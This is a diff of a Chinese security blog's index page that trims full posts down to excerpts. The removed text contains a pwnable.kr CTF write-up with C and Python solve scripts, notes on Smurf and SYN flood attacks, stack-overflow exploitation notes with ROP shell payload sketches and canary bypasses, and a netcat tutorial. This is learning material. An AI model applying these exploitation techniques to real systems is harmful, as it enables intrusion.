@@ -433,18 +433,15 @@
       
         
           
-            <h3 id="审题"><a href="#审题" class="headerlink" title="审题"></a>审题</h3><p>&emsp;&emsp;又是ssh，连上去看看，存在input.c源文件，那么直接分析源文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#code:</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	printf(&quot;Welcome to pwnable.kr\n&quot;);</span><br><span class="line">	printf(&quot;Let&apos;s see if you know how to give input to program\n&quot;);</span><br><span class="line">	printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;);</span><br><span class="line">	// argv</span><br><span class="line">	if(argc != 100) return 0;</span><br><span class="line">	if(strcmp(argv[&apos;A&apos;],&quot;\x00&quot;)) return 0;</span><br><span class="line">	if(strcmp(argv[&apos;B&apos;],&quot;\x20\x0a\x0d&quot;)) return 0;</span><br><span class="line">	printf(&quot;Stage 1 clear!\n&quot;);	</span><br><span class="line">	// stdio</span><br><span class="line">	char buf[4];</span><br><span class="line">	read(0, buf, 4);</span><br><span class="line">	if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</span><br><span class="line">	read(2, buf, 4);</span><br><span class="line">        if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 2 clear!\n&quot;);</span><br><span class="line">	</span><br><span class="line">	// env</span><br><span class="line">	if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</span><br><span class="line">	printf(&quot;Stage 3 clear!\n&quot;);</span><br><span class="line">	// file</span><br><span class="line">	FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);</span><br><span class="line">	if(!fp) return 0;</span><br><span class="line">	if( fread(buf, 4, 1, fp)!=1 ) return 0;</span><br><span class="line">	if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	printf(&quot;Stage 4 clear!\n&quot;);	</span><br><span class="line">	// network</span><br><span class="line">	int sd, cd;</span><br><span class="line">	struct sockaddr_in saddr, caddr;</span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	if(sd == -1)&#123;</span><br><span class="line">		printf(&quot;socket error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	saddr.sin_port = htons( atoi(argv[&apos;C&apos;]) );</span><br><span class="line">	if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;bind error, use another port\n&quot;);</span><br><span class="line">    		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, 1);</span><br><span class="line">	int c = sizeof(struct sockaddr_in);</span><br><span class="line">	cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</span><br><span class="line">	if(cd &lt; 0)&#123;</span><br><span class="line">		printf(&quot;accept error, tell admin\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if( recv(cd, buf, 4, 0) != 4 ) return 0;</span><br><span class="line">	if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</span><br><span class="line">	printf(&quot;Stage 5 clear!\n&quot;);</span><br><span class="line">	// here&apos;s your flag</span><br><span class="line">	system(&quot;/bin/cat flag&quot;);	</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>&emsp;&emsp; 看了下没有溢出，看来只能正常运行程序得到flag，而想运行程序到最后需满足5个条件。</p>
-<ol>
-<li>参数得100个，并且65为”\x00”,66为”\x20x0a\x0d”,67为端口号(自己定).</li>
-<li>stdin 和 stderr 得输入特定值  而特定值无法通过命令行输入得，这里我们可以通过进程间通信传。</li>
-<li>env环境变量 “\xde\xad\xbe\xef=\xca\xfe\xba\xbe”</li>
-<li>打开个”\x0a”文件，并读入4字节数据，满足为”\x00\x00\x00\x00”,可创建这个文件</li>
-<li>创建了个服务器， 等待接受数据为”\xde\xad\xbe\xef”, 我们可创建客户端连接它，发送这个数据。<h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><h4 id="Pwn–c"><a href="#Pwn–c" class="headerlink" title="Pwn–c"></a>Pwn–c</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int *argv[101]=&#123;0&#125;;</span><br><span class="line">	int pipe_stdin[2]=&#123;-1,-1&#125;,pipe_stderr[2]=&#123;-1,-1&#125;;</span><br><span class="line">	int i;</span><br><span class="line">	pid_t pid;</span><br><span class="line">	FILE *fp=NULL;</span><br><span class="line">	</span><br><span class="line">	//env</span><br><span class="line">	char *envp[2]=&#123;&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;,NULL&#125;;</span><br><span class="line">	</span><br><span class="line">	//argv</span><br><span class="line">	for(i=0;i&lt;100;i++) </span><br><span class="line">		argv[i]=&quot;a&quot;;</span><br><span class="line">	argv[0]=&quot;/home/input2/input&quot;;</span><br><span class="line">	argv[&apos;A&apos;]=&quot;\x00&quot;;</span><br><span class="line">	argv[&apos;B&apos;]=&quot;\x20\x0a\x0d&quot;;</span><br><span class="line">	argv[&apos;C&apos;]=&quot;33333&quot;;</span><br><span class="line">	argv[100]=NULL;</span><br><span class="line">	</span><br><span class="line">	//file</span><br><span class="line">	fp = fopen(&quot;\x0a&quot;,&quot;wb&quot;);</span><br><span class="line">	if(!fp) &#123;</span><br><span class="line">		printf(&quot;open file error&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite(&quot;\x00\x00\x00\x00&quot;,4,1,fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	fp=NULL;</span><br><span class="line">	</span><br><span class="line">	//stdio</span><br><span class="line">	if(pipe(pipe_stdin)&lt;0 || pipe(pipe_stderr)&lt;0) &#123;</span><br><span class="line">		printf(&quot; pipe error&quot;);</span><br><span class="line">		return 0;</span><br><span class="line"> 	&#125;</span><br><span class="line">	if((pid=fork())&lt;0) &#123;</span><br><span class="line">		printf(&quot; fork error&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if(pid == 0) &#123;</span><br><span class="line">		sleep(1);</span><br><span class="line">		close(pipe_stdin[0]);</span><br><span class="line">		close(pipe_stderr[0]);</span><br><span class="line">		write(pipe_stdin[1],&quot;\x00\x0a\x00\xff&quot;,4);</span><br><span class="line">		write(pipe_stderr[1],&quot;\x00\x0a\x02\xff&quot;,4);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		close(pipe_stdin[1]);</span><br><span class="line">		close(pipe_stderr[1]);</span><br><span class="line">		dup2(pipe_stdin[0],0);</span><br><span class="line">		dup2(pipe_stderr[0],2);</span><br><span class="line">		execve(argv[0],argv,envp);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//network</span><br><span class="line">	sleep(5);</span><br><span class="line">	int sockfd;</span><br><span class="line">	struct sockaddr_in saddr;</span><br><span class="line">	sockfd = socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line">	if(sockfd == -1) &#123;</span><br><span class="line">		printf(&quot; create socket error&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line">	saddr.sin_port = htons(33333);	</span><br><span class="line">	if(connect(sockfd, (struct sockaddr *)&amp;saddr,sizeof(saddr))&lt;0) &#123;</span><br><span class="line">		printf(&quot; connect error&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	write(sockfd, &quot;\xde\xad\xbe\xef&quot;,4);</span><br><span class="line">	close(sockfd);</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h4 id="Pwn–python"><a href="#Pwn–python" class="headerlink" title="Pwn–python"></a>Pwn–python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line"></span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">payload.append(&apos;/home/input2/input&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(64):</span><br><span class="line">	payload.append(&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">payload.append(&apos;&apos;)</span><br><span class="line">payload.append(&apos; \n\r&apos;)</span><br><span class="line">payload.append(&apos;9999&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(32):</span><br><span class="line">	payload.append(&apos;a&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stdinr, stdinw = os.pipe()</span><br><span class="line">stderrr, stderrw = os.pipe()</span><br><span class="line"></span><br><span class="line">os.write(stdinw,&apos;\x00\x0a\x00\xff&apos;)</span><br><span class="line">os.write(stderrw,&apos;\x00\x0a\x02\xff&apos;)</span><br><span class="line">environ = &#123;&apos;\xde\xad\xbe\xef&apos; : &apos;\xca\xfe\xba\xbe&apos; &#125;</span><br><span class="line"></span><br><span class="line">f = open(&apos;\n&apos;,&apos;wb&apos;)</span><br><span class="line">f.write(&apos;\x00&apos;*4)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print subprocess.Popen(payload,stdin = stdinr , stderr = stderrr , env = environ)</span><br><span class="line"></span><br><span class="line">time.sleep(2)</span><br><span class="line">try:</span><br><span class="line">	s.connect((&apos;127.0.0.1&apos;,9999))</span><br><span class="line">except:</span><br><span class="line">	print(&quot;fail&quot;)</span><br><span class="line">	exit(1)</span><br><span class="line"></span><br><span class="line">s.send(&apos;\xde\xad\xbe\xef&apos;)</span><br><span class="line"></span><br><span class="line">data = s.recv(2048)</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-          
+          审题&emsp;&emsp;又是ssh，连上去看看，存在input.c源文件，那么直接分析源文件。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/17/pwnable-kr-input2/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -593,9 +590,16 @@
       
         
           
-            <p>Smurf攻击：<br>　　发送伪装的ICMP数据包，目的地址设为某个网络的广播地址，源地址设为要攻击的目的主机，使所有收到此ICMP数据包的主机都将对目的主机发出一个回应，使被攻击主机在某一段时间内收到 成千上万的数据包</p>
+          Smurf攻击：　　发送伪装的ICMP数据包，目的地址设为某个网络的广播地址，源地址设为要攻击的目的主机，使所有收到此ICMP数据包的主机都将对目的主机发出一个回应，使被攻击主机在某一段时间内收到 成千上万的数据包
 
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/11/16/协议攻击/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -744,16 +748,18 @@
       
         
           
-            <h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><h5 id="tcp-特性"><a href="#tcp-特性" class="headerlink" title="tcp 特性"></a>tcp 特性</h5><ul>
-<li>tcp提供一种面向连接的，可靠的字节流服务。仅两方通信，不能用于广播和多播。</li>
-<li>tcp使用校验和，确认和重传来保证可靠传输</li>
-<li>tcp使用滑动窗口来实现流量控制，动态改变窗口大小来进行拥塞控制<h5 id="tcp-三次握手"><a href="#tcp-三次握手" class="headerlink" title="tcp 三次握手"></a>tcp 三次握手</h5>1.客户端发送 （SYN=1,seq=x）的包，进入SYN_SEND状态。 2.服务器返回（SYN=1,seq=y，ACK=1,ACKnum=x+1），进入SYN_RCVD状态。3.客户端发送（ACK=1,ACKnum=y+1)，进入ESTABLISHED状态，服务器收到这个包，也进入ESTABLISHED状态。<br>总结起来就是，a:你听得到我吗？ b: 我听得到，你听得到我吗？ a：我听得到你  之后开始balabala。。。<br><strong>注意</strong>：</li>
-<li>第一个包，a发送包后，没有收到b的确认（二次握手包），则会周期性超时重传，直到收到b确认，当然我们客户端可以手动结束。</li>
-<li>第二个包，若b发给a的SYN+ACK包，没有得到a的回复，则b会周期性超时重传，直到收到a的确认。</li>
-<li>这个阶段可以构成<strong>SYN攻击</strong>，即a只发送大量的SYN包，造成b（服务器）周期性回复确认包，消耗服务器资源，构成Dos/DDos攻击。检测：netstat -n -p TCP | grep SYN_RECV  防御：1.缩短超时（SYN Timeout）时间,2.增加最大半连接数, 3.过滤网关防护, 4.SYN cookies技术<h5 id="tcp-四次挥手"><a href="#tcp-四次挥手" class="headerlink" title="tcp 四次挥手"></a>tcp 四次挥手</h5>1.客户端发送（FIN=1,seq=x）表示想关闭连接，成功后进入FIN_WAIT_1状态。<br>2.服务器发送（ACK=1,ACKnum=x+1）表示接受到了客户端请求，服务器进入CLOSE_WAIT状态，客户端接受到这个包后，进入FIN_WAIT_2，等待服务器关闭连接。<br>3.服务器发送（FIN=1,seq=y）准备关闭连接，进入LAST_ACK状态。<br>4.客户端发送（ACK=1,ACKnum=y+1)确认包，进入TIME_WAIT，等待可能出现的重传ACK包，服务器收到后进入CLOSED状态，客户端等某个固定时间（2MSL），没收到重传ACK，认为服务器已经关闭连接，客户端关闭连接，进入CLOSED状态。</li>
-</ul>
-
-          
+          TCPtcp 特性
+tcp提供一种面向连接的，可靠的字节流服务。仅两方通信，不能用于广播和多播。
+tcp使用校验和，确认和重传来保证可靠传输
+tcp使用滑动窗口来实现流量控制，动态改变窗口大小来进行拥塞控制tcp 三次握手1.客户端发送 （SYN=1,seq=x）的包，进入SYN_SEND状态。 2
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/11/16/网络协议/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -902,87 +908,33 @@
       
         
           
-            <h3 id="进程中内存分段"><a href="#进程中内存分段" class="headerlink" title="进程中内存分段"></a>进程中内存分段</h3><p>Linux使用虚拟地址空间，每个进程有独立的虚拟地址空间，进程访问的虚拟地址并不是真正的物理地址,这大大增加了进程的寻址空间。由低地址到高地址如下:</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">.text</th>
-<th>.data</th>
-<th style="text-align:center">.bss</th>
-<th style="text-align:center">堆–&gt;</th>
-<th style="text-align:center">未使用与共享库</th>
-<th style="text-align:center">&lt;–栈</th>
-<th style="text-align:right">内核</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">代码段</td>
-<td>数据段</td>
-<td style="text-align:center">未初始化变量</td>
-<td style="text-align:center">malloc</td>
-<td style="text-align:center">.so</td>
-<td style="text-align:center">函数使用</td>
-<td style="text-align:right">用户不可见</td>
-</tr>
-</tbody>
-</table>
-<h3 id="栈简介"><a href="#栈简介" class="headerlink" title="栈简介"></a>栈简介</h3><p>&emsp;&emsp;栈是一种数据结构，是一种具有<strong>先进后出</strong>性质的队列,<strong>由内存高地址向低地址逆向增长</strong>，汇编中用push将数据添加到栈，pop从栈中取数据。每个进程都在内存.stack段维持自身栈，与栈相关有两个寄存器：ebp，esp。而函数调用栈是我们栈溢出基础。</p>
-<h3 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><ul>
-<li><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener">c函数调用栈1</a></li>
-<li><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">c函数调用栈2</a><br>32位和64位程序在参数保存上有所区别，<ul>
-<li>x86: 参数在eip上方，即栈上。</li>
-<li>x64: 前6个参数依次保存在RDI,RSI,RDX,RCX,R8,R9寄存器中，如果多余6个则保存在栈上。</li>
-</ul>
-</li>
-</ul>
-<h3 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h3><p>&emsp;&emsp;程序向栈中某个变量写入字节数超过了变量自己申请的字节数，导致相邻栈中变量值改变，这种称为缓冲区溢出。这种漏洞可使程序崩溃(DOS),还可能让我们控制程序流程(getshell）<br>所以栈溢出前提:</p>
-<ul>
-<li>程序能向栈上写数据</li>
-<li>写入数据大小未能良好控制</li>
-</ul>
-<h3 id="linux下栈保护"><a href="#linux下栈保护" class="headerlink" title="linux下栈保护"></a>linux下栈保护</h3><ol>
-<li><strong>cannary</strong>（在栈中插入cookie信息，函数返回时验证）</li>
-<li><strong>FORTIFY</strong> (FORTIFY_SOURCE机制对字符串有两个限制 1.包含%n的格式化字符串不能位于程序内存可写位置。2.当使用位置参数时，必须使用范围内的所有参数。即用%6$x,得同时用1,2,3,4,5。</li>
-<li><strong>NX</strong>（no-execute,堆栈不可执行),(.bss只有对写权限）</li>
-<li><strong>RELRO</strong> (full RELRO, Partial RELRO)（FR设置符号重定向为只读，减少GOT攻击)</li>
-<li><strong>ALSR</strong> 地址空间布局随机化，<br><em>只有在开启 ASLR 之后，PIE 才会生效</em><blockquote>
-<p>0就是关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同。<br>1是普通的ASLR。mmap基地址、栈基地址、.so加载基地址都将被随机化，但是堆没用随机化<br>2是增强的ASLR，增加了堆随机化</p>
-</blockquote>
-</li>
-</ol>
-<p><strong>PIE</strong>叫做代码部分地址无关，PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。<br>如果不开启PIE的话，那么每次ELF文件加载的地址都是相同的。<br>将端口绑定到程序，模仿远程服务器开启服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:9999,fork EXEC:./meet</span><br></pre></td></tr></table></figure></p>
-<h3 id="栈保护绕过"><a href="#栈保护绕过" class="headerlink" title="栈保护绕过"></a>栈保护绕过</h3><h4 id="ROP-返回导向编程"><a href="#ROP-返回导向编程" class="headerlink" title="ROP(返回导向编程)"></a><strong>ROP(返回导向编程)</strong></h4><p>&emsp;&emsp;Bypass NX and ASLR(程序执行时会使libc.so地址变化)<br>寻找控制寄存器的gdagets：ropgadgets–&gt;$ROPgadget –binary b0verfl0w –only ‘jmp|ret’<br>.text(可用函数）/.bss(写入shellcode再执行它)</p>
-<p><strong>rop调用系统调用</strong>,eg:execve(“/bin/sh”,NULL,NULL)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80</span><br></pre></td></tr></table></figure></p>
-<p><strong>NX绕过</strong><br>&emsp;&emsp;<em>Ret2libc</em>–&gt;将eip的值覆盖为libc.so(共享库）的system地址，使执行system(“/bin/sh”)<br><strong>ALSR绕过</strong></p>
-<ul>
-<li>libc已知：libc.so函数偏移地址固定，所以泄露某一地址，就可以得到其余地址，一般采用<strong>got表泄漏</strong>,当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址.</li>
-<li>libc未知：通过内存泄漏，eg：pwnlib.dynelf, 泄漏函数：puts,write,printf</li>
-</ul>
-<ol>
-<li><p><strong>stack pivoting</strong>:劫持栈指针指向攻击者控制的内存(堆,栈，.bss)然后rop</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg: shellcode|padding|fake ebp|jmp esp|set esp to shellcode jmp esp (sub esp,size jmp esp)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>frame faking</strong>:同时控制eip和ebp，改变程序栈帧。<br>payload: 执行两次 leave ret 到达我们伪造的栈帧</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">padding | fake ebp|leave ret addr</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<ul>
-<li>函数入口： push ebp mov ebp,esp</li>
-<li>函数出口： leave–&gt; mov esp,ebp pop ebp ||  ret—&gt; pop eip<br>伪造栈<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake ebp --&gt;  ebp2| target function addr| leave ret addr| arg1|arg2</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<ol start="3">
-<li><strong>stack smash</strong><br>当canary被修改，程序执行<strong>stack_chk_fail 打印 argv[0]指向的字符串（程序名)<br>劫持 </strong>stack_chk_fail的 got 值劫持流程getshell，或泄露内存</li>
-<li><strong>partial overwrite</strong>:由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的</li>
-</ol>
-<p><strong>绕过canary</strong><br>canary实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">函数序言时：</span><br><span class="line">mov    rax, qword ptr fs:[0x28]	向rbp-8插入canary</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br><span class="line">函数返回前： 检测cannary是否被修改</span><br><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure></p>
-<ol>
-<li>Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串,溢出泄露canary，并打印。</li>
-<li>可以通过劫持 <strong>stack_chk_fail的 got 值劫持流程或者利用 </strong>stack_chk_fail 泄漏内容<br>fs寄存器指向TLS结构（线程局部存储) fs:0x28指向结构中的stack_guard</li>
-</ol>
-<h3 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h3>
-          
+          进程中内存分段Linux使用虚拟地址空间，每个进程有独立的虚拟地址空间，进程访问的虚拟地址并不是真正的物理地址,这大大增加了进程的寻址空间。由低地址到高地址如下:
+
+
+
+.text
+.data
+.bss
+堆–&gt;
+未使用与共享库
+&lt;–栈
+内核
+
+
+
+
+代码段
+数据段
+未初始化变量
+mall
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/10/31/linux-栈溢出总结/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1131,29 +1083,17 @@
       
         
           
-            <p>&emsp;&emsp;<strong>netcat</strong>，瑞士军刀，通过tcp和udp在网络读写数据。能和其他工具或脚本结合使用，做出amazing thing！！你可以通过它做服务器，聊天，传输、下载数据等等。。<br>下面学习一些实例：</p>
-<h3 id="1-聊天"><a href="#1-聊天" class="headerlink" title="1.聊天"></a>1.聊天</h3><p>Server—listening<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 9999</span><br></pre></td></tr></table></figure></p>
-<p>Client—connect<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 9999</span><br></pre></td></tr></table></figure></p>
-<p>默认nc会在9999开启一个tcp服务器，输出与输入都在此shell，所以不太友好。。。</p>
-<h3 id="2-文件传输"><a href="#2-文件传输" class="headerlink" title="2.文件传输"></a>2.文件传输</h3><p>传输小文件时，方便快捷。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server:</span><br><span class="line">nc -l 9999 &lt; file1.txt 或 &gt; file2.txt</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client:</span><br><span class="line">nc -n 127.0.0.1 9999 &gt; file1.txt 或 &lt; file2.txt</span><br></pre></td></tr></table></figure>
